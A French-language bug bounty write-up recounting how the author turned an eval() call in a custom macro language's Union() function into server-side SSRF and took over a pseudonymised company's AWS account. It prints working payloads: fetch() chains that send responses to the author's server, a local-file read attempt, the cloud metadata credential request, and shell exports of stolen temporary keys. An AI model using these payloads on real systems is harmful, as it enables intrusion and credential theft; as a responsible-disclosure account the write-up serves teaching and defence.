---
date: 2018-10-02
title: AWS takeover through SSRF in JavaScript
images: [/images/aws-webservices.png]
related:
  - /posts/ctf-h1-212
  - /courses/hacking-cybersec
  - /services/code-audit
  - /services/pentest
tags:
  - bug bounty
  - aws
  - ssrf
  - javascript
---
Voici l'histoire d'une faille que j'ai découverte dans un programme de bug bunty privé sur [Hackerone](https://hackerone.com/).
Il m'a fallu exactement 12h30, sans interruption, pour la trouver, l'exploiter et la signaler.
J'ai pu récupérer les identifiants AWS, ce qui m'a permis de compromettre totalement le compte de l'entreprise : 
20 buckets et 80 instances EC2 (Amazon Elastic Compute Cloud) entre mes mains.

Outre le fait qu'il s'agit de l'une de mes meilleures découvertes en tant que bug hunter, 
j'ai également beaucoup appris durant cette session intensive. Alors, laissez moi vous la partarger !
<!--more-->


## Intro

Comme je l'ai dit, le programme est privé, donc l'entreprise, appelons-la ArticMonkey, 
a développé un langage de macros personnalisé pour ses activités et son application web, appelons-le : Banan++.
J'ignore quel langage a été utilisé initialement pour créer Banan++, mais l'application web propose une version JavaScript. Creusons un peu !

Le fichier original `banan++.js` a été minifié, mais reste énorme : 2,1Mo compressé, 2,5Mo après formatage, soit 56 441 lignes et 2 546 981 caractères. Amusez-vous !
Inutile de préciser que je n'ai pas tout lu…
En cherchant des mots-clés spécifiques à Banan++, j'ai trouvé la première fonction à la ligne 3348.
Environ 135 fonctions étaient disponibles à ce moment-là.
Voilà mon terrain de jeu !


## Repérer le problème

J'ai d'abord commencé à lire le code par le haut, mais la plupart des fonctions concernaient la manipulation de dates ou 
des opérations mathématiques, rien de vraiment intéressant ni de dangereux.

Après un moment, j'ai finalement trouvé une fonction appelée `Union()` qui semblait prometteuse, ci-dessous :
```js
helper.prototype.Union = function() {
   for (var _len22 = arguments.length, args = Array(_len22), _key22 = 0; _key22 < _len22; _key22++) args[_key22] = arguments[_key22];
   var value = args.shift(),
    symbol = args.shift(),
    results = args.filter(function(arg) {
     try {
      return eval(value + symbol + arg)
     } catch (e) {
      return !1
     }
    });
   return !!results.length
  }
```

Vous avez remarqué ça ? Vous avez remarqué cette étrange fonction `eval()` ? C'est trèèèèèès intéressant !
J'ai copié le code dans un fichier HTML local pour effectuer d'autres tests.

En gros, la fonction peut prendre de 0 à une infinité d'arguments, mais elle devient vraiment utile à partir de 3.

La fonction `eval()` sert à comparer le premier argument au troisième grâce au deuxième, puis on teste le quatrième, le cinquième, etc.
L'utilisation normale devrait ressembler à `Union(1,'<',3);` et la fonction renverrait `true` si au moins un de ces tests est vrai, ou `false`.
Cependant, aucune vérification ni aucun test n'est effectué sur le type et la valeur des arguments.
Grâce à mon débogueur préféré, `alert()`, j'ai compris qu'une faille pouvait être exploitée de différentes manières.

```js
Union( 'alert()//', '2', '3' );
Union( '1', '2;alert();', '3' );
Union( '1', '2', '3;alert()' );
...
```


## Trouver un point d'injection

J'avais donc une fonction vulnérable, ce qui est toujours bon signe, mais il me fallait une entrée pour y injecter du code malveillant.
Je me suis souvenu avoir déjà vu des paramètres POST avec des fonctions Banan++, alors j'ai fait une recherche rapide dans l'historique de Burp Suite.
Et voilà !
```http
POST /REDACTED HTTP/1.1
Host: api.REDACTED.com
Connection: close
Content-Length: 232
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3502.0 Safari/537.36 autochrome/red
Content-Type: application/json;charset=UTF-8
Referer: https://app.REDACTED.com/REDACTED
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: auth=REDACTED

{...REDACTED...,"operation":"( Year( CurrentDate() ) > 2017 )"}
```
Réponse:
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 54
Connection: close
X-Content-Type-Options: nosniff
X-Xss-Protection: 1
Strict-Transport-Security: max-age=15768000; includeSubDomains
...REDACTED...

[{"name":"REDACTED",...REDACTED...}]
```

Le paramètre `operation` semble être une bonne option. Il est temps de tester !


## Procéder à l'injection

N'ayant aucune connaissance de Banan++, j'ai dû effectuer des tests pour déterminer quel type de code je pouvais injecter.
Une sorte de fuzzing manuel.

```json
{...REDACTED...,"operation":"'\"><"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":null}
[]
```
```json
{...REDACTED...,"operation":"0"}
[]
```
```json
{...REDACTED...,"operation":"1"}
[{"name":"REDACTED",...REDACTED...}]
```
```json
{...REDACTED...,"operation":"a"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":"a=1"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":"alert"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":"alert()"}
{"status":400,"message":"Function 'alert' is not defined"}
```
```json
{...REDACTED...,"operation":"Union()"}
[]
```

J'en ai conclu que :
- Je ne peux pas injecter n'importe quel code JavaScript.
- Je peux injecter des fonctions Banan++.
- La réponse se comporte comme un indicateur booléen, vrai/faux, selon que l'interprétation du paramètre `operation` est vraie ou fausse.
(Ce qui s'est avéré très utile pour valider le code injecté)

Continuons avec `Union()` :
```json
{...REDACTED...,"operation":"Union(1,2,3)"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":"Union(a,b,c)"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":"Union('a','b','c')"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":"Union('a';'b';'c')"}
[{"name":"REDACTED",...REDACTED...}]
```
```json
{...REDACTED...,"operation":"Union('1';'2';'3')"}
[{"name":"REDACTED",...REDACTED...}]
```
```json
{...REDACTED...,"operation":"Union('1';'<';'3')"}
[{"name":"REDACTED",...REDACTED...}]
```
```json
{...REDACTED...,"operation":"Union('1';'>';'3')"}
[]]
```

Parfait ! Si `1 < 3`, la réponse contient des données valides (vrai), sinon elle est vide (faux).
Les paramètres doivent être séparés par un point-virgule.
Je peux maintenant tenter une véritable attaque.


## fetch is the new XMLHttpRequest

Comme la requête est un appel AJAX à l'API qui ne renvoie que des données JSON, il ne s'agit manifestement pas d'une injection côté client.
Je savais également, grâce à un rapport précédent, qu'ArticMonkey a tendance à utiliser beaucoup de JavaScript côté serveur.
Mais peu importe, je devais tout essayer. Peut-être pourrais-je déclencher une erreur qui révélerait des informations sur 
le système sur lequel le JavaScript s'exécute.
Ayant effectué des tests en local, je savais exactement comment injecter mon code malveillant. 
J'ai essayé des payloads XSS classiques et du JavaScript malformé, mais je n'ai obtenu que l'erreur mentionnée précédemment.

J'ai ensuite tenté d'envoyer une requête HTTP.

En commençant par un appel AJAX :
```js
x = new XMLHttpRequest;
x.open( 'GET','https://poc.myserver.com' );
x.send();
```

Mais je n'ai rien reçu. J'ai essayé l'injection HTML :
```js
i = document.createElement( 'img' );
i.src = '<img src="https://poc.myserver.com/xxx.png">';
document.body.appendChild( i );
```
Mais je n'ai rien reçu ! Nouvelles tentatives :
```js
document.body.innerHTML += '<img src="https://poc.myserver.com/xxx.png">';
```
```js
document.body.innerHTML += '<iframe src="https://poc.myserver.com">';
```

Mais je n'ai toujours rien reçu !!!

Parfois, il faut tester des trucs stupides soi-même pour se rendre compte à quel point c'était stupide...
Évidemment, essayer de générer du code HTML était une erreur, mais bon ! Je ne suis qu'un hacker...
Pour en revenir à la requête AJAX, je suis resté bloqué dessus un bon moment.
Il m'a fallu un temps fou pour comprendre comment la faire fonctionner.

J'ai fini par me souvenir qu'ArticMonkey utilise ReactJS côté client, et j'apprendrais plus tard qu'ils utilisent NodeJS côté serveur.

Bref, j'ai cherché sur Google comment effectuer une requête AJAX et j'ai trouvé la solution dans la [documentation officielle](https://reactjs.org/docs/faq-ajax.html), qui m'a conduit à la fonction [fetch()](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API), la nouvelle norme pour les appels AJAX. C'était ça la clé.

J'ai injecté les éléments suivants :
```js
fetch('https://poc.myserver.com')
```

Et j'ai immédiatement eu une nouvelle ligne dans les logs Apache.

Je peux pinguer mon serveur, mais c'est une attaque SSRF aveugle : je n'ai reçu aucune réponse.
J'ai pensé à enchaîner deux requêtes, la seconde renvoyant le résultat de la première.
Par exemple :

```js
x1 = new XMLHttpRequest;
x1.open( 'GET','https://...', false );
x1.send();
r = x1.responseText;

x2 = new XMLHttpRequest;
x2.open( 'GET','https://poc.myserver.com/?r='+r, false );
x2.send();
```

Là encore, il m'a fallu un certain temps pour trouver la syntaxe correcte avec `fetch()`.
Merci à [StackOverflow](https://stackoverflow.com/a/45529432).

J'ai finalement obtenu le code suivant, qui fonctionne plutôt bien :
```js
fetch('https://...').then(res=>res.text()).then((r)=>fetch('https://poc.myserver.com/?r='+r));
```

Bien entendu, la politique d'Origin s'applique.


## SSRF pour la victoire

J'ai d'abord essayé de lire les fichiers locaux :
```js
fetch('file:///etc/issue').then(res=>res.text()).then((r)=>fetch('https://poc.myserver.com/?r='+r));
```

Mais la réponse (paramètre `r`) dans mon fichier de log Apache était vide.

Comme j'ai trouvé des buckets S3 liés à ArticMonkey (`articmonkey-xxx`), j'ai supposé que cette entreprise utilisait peut-être 
aussi des serveurs AWS pour son application web (ce qui a été confirmé par l'en-tête `x-cache: Hit from cloudfront` dans certaines réponses).

Je me suis donc rapidement penché sur la liste des [URL SSRF pour les instances cloud](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection).

Et j'ai obtenu une réponse positive en tentant d'accéder aux métadonnées de l'instance. <a href="/images/ssrf-aws-takeover-burpsuite.png" title="AWS takeover through ssrf in javascript" target="_blank"><img src="/images/ssrf-aws-takeover-burpsuite.png" alt="AWS takeover through ssrf in javascript" /></a>

Le résultat décodé correspond à la liste des répertoires renvoyée :
```none
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
hostname
iam/
...
```

Payload final:
```none
{...REDACTED...,"operation":"Union('1';'2;fetch(\"http://169.254.169.254/latest/meta-data/\").then(res=>res.text()).then((r)=>fetch(\"https://poc.myserver.com/?r=\"+r));';'3')"}
```

N'ayant aucune connaissance des métadonnées AWS, puisque c'était ma première visite,
j'ai pris le temps d'explorer les répertoires et tous les fichiers à ma disposition. Comme vous le lirez partout, le plus intéressant étant `http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>`.

Ce qui a renvoyé :
```json
{
  "Code":"Success",
  "Type":"AWS-HMAC",
  "AccessKeyId":"...REDACTED...",
  "SecretAccessKey":"...REDACTED...",
  "Token":"...REDACTED...",
  "Expiration":"2018-09-06T19:24:38Z",
  "LastUpdated":"2018-09-06T19:09:38Z"
}
```


## Exploiter les identifiants

À ce moment-là, je pensais que c'était la fin.
Mais pour mon PoC, je voulais démontrer la gravité de cette fuite, il me fallait quelque chose de vraiment probant !
J'ai essayé d'utiliser ces identifiants pour usurper l'identité de l'entreprise.
Il faut savoir qu'il s'agit d'identifiants temporaires, valides seulement pendant une courte période, environ 5 minutes.
Bref, 5 minutes devraient largement suffire pour mettre à jour mes propres identifiants avec ceux-ci : deux copier-coller, je peux gérer ça...
Enfin...

J'ai demandé de l'aide sur Twitter aux experts SSRF et AWS. 
Merci à vous deux, j'apprécie vraiment votre implication, mais j'ai finalement trouvé la solution dans le [Guide utilisateur des Identités AWS Gestion des Accès](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html). 
Mon erreur, outre le fait de ne pas avoir lu la documentation (...), a été d'utiliser uniquement `AccessKeyId` et `SecretAccessKey`. 
Cela ne fonctionne pas, le jeton doit également être exporté. Quelle bêtise !
```sh
$ export AWS_ACCESS_KEY_ID=AKIAX7EFFWBWFRW3ACIR...
$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...
$ export AWS_SESSION_TOKEN=AQoDYXdzEJr...
```

La vérification de mon identité à l'aide de la commande suivante a prouvé que je n'étais plus moi-même.
```sh
aws sts get-caller-identity
```

Et soudain...  
<a href="/images/ssrf-aws-takeover-poc.png" title="aws takeover through ssrf in javascript" target="_blank"><img src="/images/ssrf-aws-takeover-poc.png" alt="aws takeover through ssrf in javascript" /></a>

À gauche : liste des instances EC2 configurées par ArticMonkey. Il s’agit probablement d’une grande partie, voire de la totalité, de leur système.

À droite : l’entreprise possède 20 buckets contenant des données hautement sensibles de clients, des fichiers statiques pour l’application web et, 
d’après leur nom, probablement des journaux/sauvegardes de ses serveurs.

Impact : fatal.


## Conclusion

J'ai beaucoup appris grâce à ce bug :

- [ReactJS](https://reactjs.org/), [fetch()](https://developers.google.com/web/updates/2015/03/introduction-to-fetch), métadonnées AWS.
- Lire la documentation ! La documentation officielle est toujours une excellente source d'informations (utiles).
- À chaque étape, de nouveaux problèmes sont apparus. J'ai dû chercher partout, essayer différentes solutions et repousser mes limites pour ne pas abandonner.
- Je sais maintenant que je peux compromettre entièrement un système par moi-même en partant de zéro, ce qui est une grande fierté et une grande satisfaction personnelle :)

Quand quelqu'un vous dit que vous ne pourrez jamais faire quelque chose, ne perdez pas votre temps à négocier avec ces personnes, 
prouvez-leur simplement qu'elles ont tort en le faisant.

## Chronologie

06/09/2018 12h00 - Début de la chasse  
07/09/2018 00h30 - Signalement  
07/09/2018 19h30 - Correction et récompense  

Merci à ArticMonkey pour sa réactivité et sa contribution à cet article :)
